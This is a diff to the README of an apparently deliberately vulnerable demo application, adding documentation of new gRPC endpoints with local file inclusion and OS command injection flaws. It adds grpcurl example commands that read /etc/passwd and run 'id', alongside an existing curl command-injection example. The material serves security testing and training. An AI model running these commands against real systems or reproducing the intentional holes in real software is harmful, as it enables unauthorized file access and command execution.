@@ -348,6 +348,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
   </details>
 
 - **Local File Inclusion (LFI)** - The /api/files endpoint returns any file on the server from the path that is provided in the _path_ param. The UI uses this endpoint to load crystal images on the landing page.
+  Additionally, the application exposes a gRPC endpoint `FileService/ReadFile` which is also vulnerable to LFI/RFI.
 
   <details>
     <summary>Example Exploitation</summary>
@@ -397,6 +398,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
            # Entries added by HostAliases.
            127.0.0.1       postgres        keycloak-postgres       keycloak        nodejs  proxy   repeater        db      brokencrystals.local
            ```
+
+  3.  Accessing the `/etc/passwd` File via gRPC `FileService/ReadFile`
+
+      ```bash
+      grpcurl -plaintext -proto src/grpc/file.proto -d '{"path": "/etc/passwd"}' localhost:5000 file.FileService/ReadFile
+      ```
 
       </details>
 
@@ -484,10 +491,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
     </details>
 
 - **OS Command Injection** - The /api/spawn endpoint spawns a new process using the command in the _command_ query parameter. The endpoint is not referenced from UI.
+  Additionally, the application exposes a gRPC endpoint `OsService/RunCommand` which is also vulnerable to OS Command Injection.
+
     <details>
       <summary>Example Exploitation</summary>
 
-      To demonstrate an SSTI attack, you can use the following `curl` command:
+      To demonstrate an OS Command Injection attack, you can use the following `curl` command:
 
       ```bash
       $ curl 'https://brokencrystals.com/api/spawn?command=uname%20-a'
@@ -497,6 +506,12 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
       ```
       Linux brokencrystals-5b9b6759cb-66vvt 6.1.115-126.197.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Nov  5 17:36:57 UTC 2024 x86_64 Linux
+      ```
+
+      To demonstrate the attack via gRPC:
+
+      ```bash
+      grpcurl -plaintext -proto src/grpc/os.proto -d '{"command": "id"}' localhost:5000 os.OsService/RunCommand
       ```
 
     </details>
